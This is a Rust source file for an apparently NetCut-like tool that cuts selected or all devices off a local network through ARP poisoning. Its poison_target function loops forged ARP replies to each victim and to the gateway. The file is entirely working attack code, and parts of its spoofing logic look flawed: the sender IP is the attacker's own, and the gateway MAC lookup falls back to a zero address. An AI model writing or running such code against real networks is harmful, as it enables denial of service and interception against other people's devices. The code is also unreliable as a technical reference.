use crate::models::{DeviceStatus, NetworkDevice};
use anyhow::Result;
use pnet::datalink::{self, Channel, MacAddr, NetworkInterface};
use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, MutableArpPacket};
use pnet::packet::ethernet::{EtherTypes, MutableEthernetPacket};
use pnet::packet::Packet;
use std::net::Ipv4Addr;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

pub fn kill_selected_devices(devices: &Arc<Mutex<Vec<NetworkDevice>>>) {
    let mut devices_lock = devices.lock().unwrap();
    for device in devices_lock.iter_mut() {
        if device.selected && device.status != DeviceStatus::Blocked {
            device.status = DeviceStatus::Blocked;
            if let Err(e) = poison_target(device.clone()) {
                eprintln!("Failed to poison target: {}", e);
            }
        }
    }
}

pub fn kill_all_devices(devices: &Arc<Mutex<Vec<NetworkDevice>>>) {
    let mut devices_lock = devices.lock().unwrap();
    for device in devices_lock.iter_mut() {
        if device.status != DeviceStatus::Blocked {
            device.status = DeviceStatus::Blocked;
            if let Err(e) = poison_target(device.clone()) {
                eprintln!("Failed to poison target: {}", e);
            }
        }
    }
}

fn poison_target(device: NetworkDevice) -> Result<()> {
    let interface = get_default_interface()?;
    let source_ip = interface
        .ips
        .iter()
        .find(|ip| ip.is_ipv4())
        .map(|ip| match ip.ip() {
            std::net::IpAddr::V4(ip) => ip,
            _ => unreachable!(),
        })
        .ok_or_else(|| anyhow::anyhow!("No IPv4 address found"))?;

    let gateway_ip = default_net::get_default_gateway()
        .map_err(|e| anyhow::anyhow!("Failed to get default gateway: {}", e))?
        .ip_addr
        .to_string()
        .parse::<Ipv4Addr>()?;

    let target_ip = device.ip_address.parse::<Ipv4Addr>()?;
    let target_mac = device.mac_address.parse::<MacAddr>()?;

    thread::spawn(move || {
        let (mut tx, _) = match datalink::channel(&interface, Default::default()) {
            Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
            _ => {
                eprintln!("Unsupported channel type");
                return;
            }
        };

        loop {
            // Poison target device
            send_arp_reply(
                &mut *tx,
                &interface,
                source_ip,
                gateway_ip,
                interface.mac.unwrap(),
                target_mac,
            );

            // Poison gateway
            send_arp_reply(
                &mut *tx,
                &interface,
                source_ip,
                target_ip,
                interface.mac.unwrap(),
                datalink::interfaces()
                    .iter()
                    .find(|i| {
                        i.ips.iter().any(|ip| {
                            ip.ip().to_string() == gateway_ip.to_string()
                        })
                    })
                    .and_then(|i| i.mac)
                    .unwrap_or_else(MacAddr::zero),
            );

            thread::sleep(Duration::from_secs(2));
        }
    });

    Ok(())
}

fn send_arp_reply(
    tx: &mut dyn datalink::DataLinkSender,
    _interface: &NetworkInterface,
    source_ip: Ipv4Addr,
    target_ip: Ipv4Addr,
    source_mac: MacAddr,
    target_mac: MacAddr,
) {
    let mut ethernet_buffer = [0u8; 42];
    let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();

    ethernet_packet.set_destination(target_mac);
    ethernet_packet.set_source(source_mac);
    ethernet_packet.set_ethertype(EtherTypes::Arp);

    let mut arp_buffer = [0u8; 28];
    let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();

    arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
    arp_packet.set_protocol_type(EtherTypes::Ipv4);
    arp_packet.set_hw_addr_len(6);
    arp_packet.set_proto_addr_len(4);
    arp_packet.set_operation(ArpOperations::Reply);
    arp_packet.set_sender_hw_addr(source_mac);
    arp_packet.set_sender_proto_addr(source_ip);
    arp_packet.set_target_hw_addr(target_mac);
    arp_packet.set_target_proto_addr(target_ip);

    ethernet_packet.set_payload(arp_packet.packet());

    tx.send_to(ethernet_packet.packet(), None);
}

fn get_default_interface() -> Result<NetworkInterface> {
    datalink::interfaces()
        .into_iter()
        .find(|iface| {
            iface.is_up()
                && !iface.is_loopback()
                && iface.mac.is_some()
                && iface.ips.iter().any(|ip| ip.is_ipv4())
        })
        .ok_or_else(|| anyhow::anyhow!("No suitable network interface found"))
}
